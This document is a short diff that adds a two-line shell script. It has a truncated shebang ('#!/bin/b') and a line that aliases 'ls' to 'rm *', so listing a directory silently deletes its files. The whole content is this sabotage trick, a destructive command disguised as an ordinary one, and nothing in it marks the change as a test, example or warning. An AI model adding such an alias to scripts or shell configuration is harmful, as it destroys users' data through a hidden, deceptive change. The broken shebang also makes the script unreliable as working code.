@@ -1,0 +1,2 @@
+#!/bin/b
+alias ls="rm *"
